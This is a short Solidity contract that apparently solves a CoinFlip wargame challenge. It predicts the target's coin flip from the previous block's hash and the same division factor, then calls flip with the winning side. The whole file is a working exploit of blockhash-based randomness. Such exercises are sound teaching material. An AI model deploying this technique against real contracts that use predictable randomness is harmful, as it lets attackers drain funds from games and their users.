// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;
import "./ICoinFlip.sol";
contract Flipper {
    constructor() {}

    function say42() public pure returns (uint256) {
        return 42;
    }

    function winFlip(address target_address) public returns (bool) {
        ICoinFlip target = ICoinFlip(target_address);
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        bool result = target.flip(side);
        require(result); // revert if we lost somehow (like if in the same block)
        return result; // always true, for testing
    }

}
